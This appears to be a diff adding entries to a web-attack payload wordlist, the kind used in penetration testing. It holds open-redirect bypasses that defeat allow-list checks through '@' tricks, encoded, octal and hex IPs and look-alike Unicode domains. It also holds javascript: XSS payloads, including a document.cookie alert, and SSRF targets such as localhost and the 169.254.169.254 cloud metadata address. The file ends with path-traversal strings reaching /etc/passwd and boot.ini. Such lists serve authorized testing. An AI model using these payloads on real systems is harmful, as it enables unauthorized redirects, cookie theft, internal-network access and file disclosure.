+/https:///whitelisted.com@Ⓛ𝐨𝗰 𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2f%2e%2e
+/https://whitelisted.com@Ⓛ𝐨𝗰 𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2f%2e%2e
+https:///whitelisted.com@Ⓛ𝐨𝗰 𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2f%2e%2e
+https://whitelisted.com@Ⓛ𝐨𝗰 𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2f%2e%2e
+//https://whitelisted.com@google.com//
+/https://whitelisted.com@google.com/
+https://whitelisted.com;@google.com
+https://whitelisted.com.google.com
+https://whitelisted.com@google.com//
+https://whitelisted.com@google.com/
+https://whitelisted.com@google.com
+/https://whitelisted.com@google.com/%2e%2e
+https:///whitelisted.com@google.com/%2e%2e
+//https://whitelisted.com@google.com/%2e%2e%2f
+https://whitelisted.com@google.com/%2e%2e%2f
+/https://whitelisted.com@google.com/%2f..
+https://whitelisted.com@google.com/%2f..
+/https:///whitelisted.com@google.com/%2f%2e%2e
+/https://whitelisted.com@google.com/%2f%2e%2e
+https:///whitelisted.com@google.com/%2f%2e%2e
+https://whitelisted.com@google.com/%2f%2e%2e
+/https://whitelisted.com@google.com/%2f.//whitelisted.com@google.com/%2f..
+https://whitelisted.com/https://Ⓛ𝐨𝗰 𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/
+https://whitelisted.com/https://google.com/
+@https://www.google.com
+http://Ⓛ𝐨𝗰 𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ\twhitelisted.com/
+http://whitelisted.com@00330.00072.0000326.00000316
+http:whitelisted.com@00330.00072.0000326.00000316
+http://whitelisted.com@00330.0x3a.54990
+http:whitelisted.com@00330.0x3a.54990
+http://whitelisted.com@00330.3856078
+http:whitelisted.com@00330.3856078
+http://whitelisted.com@0330.072.0326.0316
+http:whitelisted.com@0330.072.0326.0316
+http://whitelisted.com@0xd8.072.54990
+http:whitelisted.com@0xd8.072.54990
+http://whitelisted.com@0xd8.0x3a.0xd6.0xce
+http:whitelisted.com@0xd8.0x3a.0xd6.0xce
+http://whitelisted.com@0xd8.3856078
+http:whitelisted.com@0xd8.3856078
+http://whitelisted.com@0xd83ad6ce
+http:whitelisted.com@0xd83ad6ce
+http://whitelisted.com@[::216.58.214.206]
+http:whitelisted.com@[::216.58.214.206]
+http://whitelisted.com%2eⓁ𝐨𝗰 𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/
+http://whitelisted.com%2egoogle.com/
+http://whitelisted.com@3627734734
+http:whitelisted.com@3627734734
+http://whitelisted.com@472.314.470.462
+http:whitelisted.com@472.314.470.462
+http://whitelisted.com:80%40Ⓛ𝐨𝗰 𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/
+http://whitelisted.com:80%40google.com/
+http://whitelisted.com@[::ffff:216.58.214.206]
+http:whitelisted.com@[::ffff:216.58.214.206]
+http://whitelisted.com@google.com/
+http://whitelisted.com+&@google.com#+@whitelisted.com/
+http://whitelisted.com+&@Ⓛ𝐨𝗰 𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ#+@whitelisted.com/
+http://www.google.com\.whitelisted.com
+http://www.Ⓛ𝐨𝗰 𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ\.whitelisted.com
+http://XY>.7d8T\205pZM@00330.00072.0000326.00000316
+http:XY>.7d8T\205pZM@00330.00072.0000326.00000316
+http://XY>.7d8T\205pZM@00330.0x3a.54990
+http:XY>.7d8T\205pZM@00330.0x3a.54990
+http://XY>.7d8T\205pZM@00330.3856078
+http:XY>.7d8T\205pZM@00330.3856078
+http://XY>.7d8T\205pZM@0330.072.0326.0316
+http:XY>.7d8T\205pZM@0330.072.0326.0316
+http://XY>.7d8T\205pZM@0xd8.072.54990
+http:XY>.7d8T\205pZM@0xd8.072.54990
+http://XY>.7d8T\205pZM@0xd8.0x3a.0xd6.0xce
+http:XY>.7d8T\205pZM@0xd8.0x3a.0xd6.0xce
+http://XY>.7d8T\205pZM@0xd8.3856078
+http:XY>.7d8T\205pZM@0xd8.3856078
+http://XY>.7d8T\205pZM@0xd83ad6ce
+http:XY>.7d8T\205pZM@0xd83ad6ce
+http://XY>.7d8T\205pZM@[::216.58.214.206]
+http:XY>.7d8T\205pZM@[::216.58.214.206]
+http://XY>.7d8T\205pZM@3627734734
+http:XY>.7d8T\205pZM@3627734734
+http://XY>.7d8T\205pZM@472.314.470.462
+http:XY>.7d8T\205pZM@472.314.470.462
+http://XY>.7d8T\205pZM@[::ffff:216.58.214.206]
+http:XY>.7d8T\205pZM@[::ffff:216.58.214.206]
+http://XY>.7d8T\205pZM@whitelisted.com@Ⓛ𝐨𝗰 𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/
+http://XY>.7d8T\205pZM@whitelisted.com+@Ⓛ𝐨𝗰 𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/
+http://XY>.7d8T\205pZM@whitelisted.com@google.com/
+http://XY>.7d8T\205pZM@whitelisted.com+@google.com/
+ja\nva\tscript\r:alert(1)
+java%09script:alert(1)
+java%0ascript:alert(1)
+java%0d%0ascript%0d%0a:alert(0)
+java%0dscript:alert(1)
+Javas%26%2399;ript:alert(1)
+javascript://%0aalert(1)
+<>javascript:alert(1);
+//javascript:alert(1);
+//javascript:alert(1)
+/javascript:alert(1);
+/javascript:alert(1)
+\j\av\a\s\cr\i\pt\:\a\l\ert\(1\)
+javascript:alert(1);
+javascript:alert(1)
+javascripT://anything%0D%0A%0D%0Awindow.alert(document.cookie)
+javascript:confirm(1)
+javascript://https://whitelisted.com/?z=%0Aalert(1)
+javascript:prompt(1)
+jaVAscript://whitelisted.com//%0d%0aalert(1);//
+javascript://whitelisted.com?%a0alert%281%29
+//Ⓛ𝐨𝗰 𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ\twhitelisted.com/
+\u006A\u0061\u0076\u0061\u0073\u0063\u0072\u0069\u0070\u0074\u003aalert(1)
+////whitelisted.com@Ⓛ𝐨𝗰 𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ//
+////whitelisted.com@Ⓛ𝐨𝗰 𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/
+///whitelisted.com@Ⓛ𝐨𝗰 𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ//
+///whitelisted.com@Ⓛ𝐨𝗰 𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/
+//Ⓛ𝐨𝗰 𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/whitelisted.com
+//Ⓛ𝐨𝗰 𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ\@whitelisted.com
+//whitelisted.com@Ⓛ𝐨𝗰 𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ//
+//whitelisted.com@Ⓛ𝐨𝗰 𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/
+Ⓛ𝐨𝗰 𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/whitelisted.com
+whitelisted.com;@Ⓛ𝐨𝗰 𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
+////whitelisted.com@Ⓛ𝐨𝗰 𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2e%2e
+///whitelisted.com@Ⓛ𝐨𝗰 𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2e%2e
+////whitelisted.com@Ⓛ𝐨𝗰 𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2e%2e%2f
+///whitelisted.com@Ⓛ𝐨𝗰 𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2e%2e%2f
+//whitelisted.com@Ⓛ𝐨𝗰 𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2e%2e%2f
+////whitelisted.com@Ⓛ𝐨𝗰 𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2f..
+///whitelisted.com@Ⓛ𝐨𝗰 𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2f..
+//whitelisted.com@Ⓛ𝐨𝗰 𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2f..
+////whitelisted.com@Ⓛ𝐨𝗰 𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2f%2e%2e
+///whitelisted.com@Ⓛ𝐨𝗰 𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2f%2e%2e
+//whitelisted.com@Ⓛ𝐨𝗰 𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2f%2e%2e
+/\whitelisted.com:80%40google.com
+whitelisted.com@%E2%80%AE@google.com
+////whitelisted.com@google.com//
+////whitelisted.com@google.com/
+///whitelisted.com@google.com//
+///whitelisted.com@google.com/
+//whitelisted.com@google.com//
+//whitelisted.com@google.com/
+whitelisted.com;@google.com
+whitelisted.com.google.com
+////whitelisted.com@google.com/%2e%2e
+///whitelisted.com@google.com/%2e%2e
+////whitelisted.com@google.com/%2e%2e%2f
+///whitelisted.com@google.com/%2e%2e%2f
+//whitelisted.com@google.com/%2e%2e%2f
+////whitelisted.com@google.com/%2f..
+///whitelisted.com@google.com/%2f..
+//whitelisted.com@google.com/%2f..
+////whitelisted.com@google.com/%2f%2e%2e
+///whitelisted.com@google.com/%2f%2e%2e
+//whitelisted.com@google.com/%2f%2e%2e
+//whitelisted.com+&@google.com#+@whitelisted.com/
+//whitelisted.com@https:///Ⓛ𝐨𝗰 𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2e%2e
+//whitelisted.com@https:///google.com/%2e%2e
+//whitelisted.com+&@Ⓛ𝐨𝗰 𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ#+@whitelisted.com/
+/x:1/:///%01javascript:alert(document.cookie)/
+\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x3aalert(1)
+//XY>.7d8T\205pZM@whitelisted.com@Ⓛ𝐨𝗰 𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/
+//XY>.7d8T\205pZM@whitelisted.com+@Ⓛ𝐨𝗰 𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/
+//XY>.7d8T\205pZM@whitelisted.com@google.com/
+//XY>.7d8T\205pZM@whitelisted.com+@google.com/
+https://127.0.0.1/
+https://localhost/
+http://[::]:80/
+http://[::]:25/
+http://[::]:3128/
+http://0000::1:80/
+http://0000::1:25/
+http://0000::1:22/
+http://0000::1:3128/
+http://spoofed.burpcollaborator.net
+http://localtest.me
+http://customer1.app.localhost.my.company.127.0.0.1.nip.io
+http://mail.ebc.apple.com
+http://bugbounty.dod.network
+http://127.127.127.127
+http://127.0.1.3
+http://127.0.0.0
+http://0177.0.0.1/
+http://2130706433/ = http://127.0.0.1
+http://3232235521/ = http://192.168.0.1
+http://3232235777/ = http://192.168.1.1
+http://2852039166/  = http://169.254.169.254
+http://[0:0:0:0:0:ffff:127.0.0.1]
+localhost:+11211aaa
+localhost:00011211aaaa
+http://0/
+http://127.1
+http://127.0.1
+http://127.0.0.1/%61dmin
+http://127.0.0.1/%2561dmin
+http://1.1.1.1 &@2.2.2.2# @3.3.3.3/
+urllib2 : 1.1.1.1
+requests + browsers : 2.2.2.2
+urllib : 3.3.3.3
+http://ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ = example.com
+0://evil.com:80;http://google.com:80/
+http://127.1.1.1:80\@127.2.2.2:80/
+http://127.1.1.1:80\@@127.2.2.2:80/
+http://127.1.1.1:80:\@@127.2.2.2:80/
+http://127.1.1.1:80#\@127.2.2.2:80/
 ..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../boot.ini
 /%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/boot.ini
 /cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
